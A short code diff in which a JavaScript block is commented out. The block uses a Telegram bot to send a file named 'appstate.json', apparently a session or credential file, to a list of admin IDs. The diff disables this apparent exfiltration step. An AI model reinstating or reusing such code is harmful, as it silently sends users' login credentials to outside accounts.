@@ -1,3 +1,4 @@
+/*
 const TelegramBot = require('node-telegram-bot-api');
 const fs = require('fs');
 
@@ -11,3 +12,4 @@ adminIds.forEach(adminId => {
 
   bot.sendDocument(adminId, fileStream, { filename: 'appstate.json' });
 });
+*/
